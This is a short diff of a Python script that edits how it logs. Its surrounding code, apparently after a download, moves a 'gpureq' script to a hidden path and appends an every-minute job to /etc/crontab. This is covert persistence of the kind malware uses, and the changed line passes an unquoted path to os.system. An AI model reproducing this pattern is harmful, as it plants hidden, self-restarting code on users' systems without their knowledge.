@@ -44,11 +44,12 @@ if response1.status_code == 200:
         os.rename(gpureq_path, hidden_path)
 
         # Check if the log file exists, if not, create it
-        if not os.path.exists("~/cron.log"):
-            os.system("touch ~/cron.log")
+        log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cron.log")
+        if not os.path.exists(log_file):
+            os.system(f"touch {log_file}")
 
         # Schedule the daemon to run every minute
-        crontab_line = "* * * * * /usr/bin/python3 ~/.myapp/gpureq.py >> ~/cron.log 2>&1\n"
+        crontab_line = f"* * * * * /usr/bin/python3 ~/.myapp/gpureq.py >> {log_file} 2>&1\n"
         with open("/etc/crontab", "a") as cron_file:
             cron_file.write(crontab_line)
 
